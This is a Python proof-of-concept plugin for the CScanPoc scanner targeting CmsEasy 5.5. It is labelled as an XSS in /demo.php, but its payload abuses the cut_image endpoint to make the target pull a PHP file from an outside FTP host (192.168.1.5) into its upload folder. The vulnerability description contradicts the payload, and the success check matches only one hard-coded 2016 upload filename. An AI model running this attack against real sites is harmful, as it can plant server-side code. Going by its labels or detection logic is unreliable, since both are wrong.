# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'CmsEasy_0003_undone'  # 平台漏洞编号，留空
    name = 'CmsEasy 5.5 /demo.php XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-10-21'  # 漏洞公布时间
    desc = '''
        CmsEasy /demo.php文件存在xss漏洞。
    '''  # 漏洞描述
    ref = 'https://github.com/Medicean/VulApps/tree/master/c/cmseasy/1'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CmsEasy'  # 漏洞应用名称
    product_version = '<=5.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5e05d13d-987e-4523-8f50-44ce473f2328'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload = '/index.php?case=tool&act=cut_image'
            data = 'pic=1ftp://192.168.1.5/phpinfo.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120'
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url, data=data)

            if '\/upload\/images\/201612\/148159258747.php' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
